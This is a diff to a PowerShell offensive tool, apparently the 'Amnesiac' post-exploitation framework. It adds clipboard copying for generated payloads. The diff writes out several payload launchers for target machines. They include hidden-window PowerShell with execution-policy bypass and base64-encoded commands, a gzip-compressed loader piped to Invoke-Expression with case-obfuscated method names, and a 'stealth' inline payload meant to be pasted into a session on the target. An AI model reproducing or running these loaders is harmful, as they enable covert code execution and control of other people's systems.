@@ -1850,6 +1850,7 @@ while (`$true) {
 	
 	$b64ClientScript = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($ClientScript))
 	
+	$_clipPayload = $null
 	if(!$HidePayload){
 		if($chosenFormat -eq 'exe'){
 			$exefilelocation = "C:\Users\Public\Documents\Amnesiac\Payloads\$($PipeName).exe"
@@ -1863,21 +1864,25 @@ while (`$true) {
 			Write-Output ""
 		}
 		if($chosenFormat -eq 'b64'){
-			Write-Output " powershell.exe -NoLogo -NonInteractive -ep bypass -WindowS Hidden -enc $b64ClientScript & exit"
+			$_clipPayload = "powershell.exe -NoLogo -NonInteractive -ep bypass -WindowS Hidden -enc $b64ClientScript & exit"
+			Write-Output " $_clipPayload"
 			Write-Output ""
 		}
 		elseif($chosenFormat -eq 'raw'){
-			Write-Output " cmd /c powershell -windows hidden `"$RawClientScript`" & exit"
+			$_clipPayload = "cmd /c powershell -windows hidden `"$RawClientScript`" & exit"
+			Write-Output " $_clipPayload"
 			Write-Output ""
 		}
 		elseif($chosenFormat -eq 'pwraw'){
-			Write-Output " $PwshRawClientScript"
+			$_clipPayload = $PwshRawClientScript
+			Write-Output " $_clipPayload"
 			Write-Output ""
 		}
 		elseif($chosenFormat -eq 'pwsh'){
 			$ClientScriptEdit = $ClientScript += ";exit"
 			$b64ServerScriptEdit = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($ClientScriptEdit))
-			Write-Output " Start-Process powershell.exe -WindowS Hidden -ArgumentList `"-NoP`", `"-ep Bypass`", `"-enc $b64ServerScriptEdit`""
+			$_clipPayload = "Start-Process powershell.exe -WindowS Hidden -ArgumentList `"-NoP`", `"-ep Bypass`", `"-enc $b64ServerScriptEdit`""
+			Write-Output " $_clipPayload"
 			Write-Output ""
 		}
   		elseif($chosenFormat -eq 'gzip'){
@@ -1888,9 +1893,10 @@ while (`$true) {
 			$gzipCompressor.Close()
 			$gzipcompressedBytes = $memoryStream.ToArray()
 			$gzipcompressedBase64 = [Convert]::ToBase64String($gzipcompressedBytes)
-			Write-Output " `$gz=`'$gzipcompressedBase64`';`$a=New-Object IO.MemoryStream(,[Convert]::FROmbAsE64StRiNg(`$gz));`$b=New-Object IO.Compression.GzipStream(`$a,[IO.Compression.CoMPressionMode]::deCOmPreSs);`$c=New-Object System.IO.MemoryStream;`$b.COpYTo(`$c);`$d=[System.Text.Encoding]::UTF8.GETSTrIng(`$c.ToArray());`$b.ClOse();`$a.ClosE();`$c.cLose();`$d|IEX > `$null"
+			$_clipPayload = "`$gz='$gzipcompressedBase64';`$a=New-Object IO.MemoryStream(,[Convert]::FROmbAsE64StRiNg(`$gz));`$b=New-Object IO.Compression.GzipStream(`$a,[IO.Compression.CoMPressionMode]::deCOmPreSs);`$c=New-Object System.IO.MemoryStream;`$b.COpYTo(`$c);`$d=[System.Text.Encoding]::UTF8.GETSTrIng(`$c.ToArray());`$b.ClOse();`$a.ClosE();`$c.cLose();`$d|IEX > `$null"
+			Write-Output " $_clipPayload"
 			Write-Output ""
-			Write-Output " powershell.exe -ep bypass -Window Hidden -c `"`$gz=`'$gzipcompressedBase64`';`$a=New-Object IO.MemoryStream(,[Convert]::FROmbAsE64StRiNg(`$gz));`$b=New-Object IO.Compression.GzipStream(`$a,[IO.Compression.CoMPressionMode]::deCOmPreSs);`$c=New-Object System.IO.MemoryStream;`$b.COpYTo(`$c);`$d=[System.Text.Encoding]::UTF8.GETSTrIng(`$c.ToArray());`$b.ClOse();`$a.ClosE();`$c.cLose();`$d|IEX > `$null`""
+			Write-Output " powershell.exe -ep bypass -Window Hidden -c `"$_clipPayload`""
 			Write-Output ""
 		}
   		elseif($chosenFormat -eq 'exe'){
@@ -1902,12 +1908,17 @@ while (`$true) {
 		elseif($chosenFormat -eq 'stealth'){
 			$built = New-PayloadScript -ComputerName $ComputerName -PipeName $PipeName
 			$wrapped = Get-PayloadLauncher -Script $built.InlinePS -Launcher $global:PayloadConfig.Launcher
-			Write-Output " [Inline PS — paste into existing session]"
-			Write-Output " $($built.InlinePS)"
+			$_clipPayload = $built.InlinePS
+			Write-Output " [Inline PS -- paste into existing session]"
+			Write-Output " $_clipPayload"
 			Write-Output ""
-			Write-Output " [Full command — launcher: $($global:PayloadConfig.Launcher)]"
+			Write-Output " [Full command -- launcher: $($global:PayloadConfig.Launcher)]"
 			Write-Output " $wrapped"
 			Write-Output ""
+		}
+		if ($_clipPayload) {
+			Set-Clipboard -Value $_clipPayload
+			Write-Host " [*] Payload copied to clipboard" -Foreground green
 		}
 	}
 
@@ -2063,6 +2074,7 @@ while (`$true) {
 	Write-Output ""
 	Write-Host " [+] Global-Listener PipeName: $global:MultiPipeName" -Foreground yellow
 	Write-Output ""
+	$_clipPayload = $null
 	if($chosenFormat -eq 'exe'){
 		$exefilelocation = "C:\Users\Public\Documents\Amnesiac\Payloads\$($global:MultiPipeName).exe"
 		Write-Host " [+] Payload saved to: $exefilelocation" -Foreground cyan
@@ -2073,21 +2085,25 @@ while (`$true) {
 		Write-Output ""
 	}
 	if($chosenFormat -eq 'b64'){
-		Write-Output " powershell.exe -NoLogo -NonInteractive -ep bypass -WindowS Hidden -enc $b64ServerScript & exit"
+		$_clipPayload = "powershell.exe -NoLogo -NonInteractive -ep bypass -WindowS Hidden -enc $b64ServerScript & exit"
+		Write-Output " $_clipPayload"
 		Write-Output ""
 	}
 	elseif($chosenFormat -eq 'raw'){
-		Write-Output " cmd /c powershell -windowst hidden `"$RawServerScript`" & exit"
+		$_clipPayload = "cmd /c powershell -windowst hidden `"$RawServerScript`" & exit"
+		Write-Output " $_clipPayload"
 		Write-Output ""
 	}
 	elseif($chosenFormat -eq 'pwraw'){
-		Write-Output " $PwshRawServerScript"
+		$_clipPayload = $PwshRawServerScript
+		Write-Output " $_clipPayload"
 		Write-Output ""
 	}
 	elseif($chosenFormat -eq 'pwsh'){
 		$ServerScriptEdit = $ServerScript += ";exit"
 		$b64ServerScriptEdit = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($ServerScriptEdit))
-		Write-Output " Start-Process powershell.exe -WindowS Hidden -ArgumentList `"-NoP`", `"-ep Bypass`", `"-enc $b64ServerScriptEdit`""
+		$_clipPayload = "Start-Process powershell.exe -WindowS Hidden -ArgumentList `"-NoP`", `"-ep Bypass`", `"-enc $b64ServerScriptEdit`""
+		Write-Output " $_clipPayload"
 		Write-Output ""
 	}
  	elseif($chosenFormat -eq 'gzip'){
@@ -2098,9 +2114,10 @@ while (`$true) {
 		$gzipCompressor.Close()
 		$gzipcompressedBytes = $memoryStream.ToArray()
 		$gzipcompressedBase64 = [Convert]::ToBase64String($gzipcompressedBytes)
-		Write-Output " `$gz=`'$gzipcompressedBase64`';`$a=New-Object IO.MemoryStream(,[Convert]::FROmbAsE64StRiNg(`$gz));`$b=New-Object IO.Compression.GzipStream(`$a,[IO.Compression.CoMPressionMode]::deCOmPreSs);`$c=New-Object System.IO.MemoryStream;`$b.COpYTo(`$c);`$d=[System.Text.Encoding]::UTF8.GETSTrIng(`$c.ToArray());`$b.ClOse();`$a.ClosE();`$c.cLose();`$d|IEX > `$null"
+		$_clipPayload = "`$gz='$gzipcompressedBase64';`$a=New-Object IO.MemoryStream(,[Convert]::FROmbAsE64StRiNg(`$gz));`$b=New-Object IO.Compression.GzipStream(`$a,[IO.Compression.CoMPressionMode]::deCOmPreSs);`$c=New-Object System.IO.MemoryStream;`$b.COpYTo(`$c);`$d=[System.Text.Encoding]::UTF8.GETSTrIng(`$c.ToArray());`$b.ClOse();`$a.ClosE();`$c.cLose();`$d|IEX > `$null"
+		Write-Output " $_clipPayload"
 		Write-Output ""
-		Write-Output " powershell.exe -ep bypass -Window Hidden -c `"`$gz=`'$gzipcompressedBase64`';`$a=New-Object IO.MemoryStream(,[Convert]::FROmbAsE64StRiNg(`$gz));`$b=New-Object IO.Compression.GzipStream(`$a,[IO.Compression.CoMPressionMode]::deCOmPreSs);`$c=New-Object System.IO.MemoryStream;`$b.COpYTo(`$c);`$d=[System.Text.Encoding]::UTF8.GETSTrIng(`$c.ToArray());`$b.ClOse();`$a.ClosE();`$c.cLose();`$d|IEX > `$null`""
+		Write-Output " powershell.exe -ep bypass -Window Hidden -c `"$_clipPayload`""
 		Write-Output ""
 	}
 	elseif($chosenFormat -eq 'exe'){
@@ -2113,12 +2130,17 @@ while (`$true) {
 		$stealthSID = if($global:Detach){'S-1-1-0'} else {$SID}
 		$built = New-PayloadScript -IsServer -PipeName $PN -SID $stealthSID
 		$wrapped = Get-PayloadLauncher -Script $built.InlinePS -Launcher $global:PayloadConfig.Launcher
-		Write-Output " [Inline PS — paste into existing session on target]"
-		Write-Output " $($built.InlinePS)"
+		$_clipPayload = $built.InlinePS
+		Write-Output " [Inline PS -- paste into existing session on target]"
+		Write-Output " $_clipPayload"
 		Write-Output ""
-		Write-Output " [Full command — launcher: $($global:PayloadConfig.Launcher)]"
+		Write-Output " [Full command -- launcher: $($global:PayloadConfig.Launcher)]"
 		Write-Output " $wrapped"
 		Write-Output ""
+	}
+	if ($_clipPayload) {
+		Set-Clipboard -Value $_clipPayload
+		Write-Host " [*] Payload copied to clipboard" -Foreground green
 	}
 
 	if (!$NoWait) {
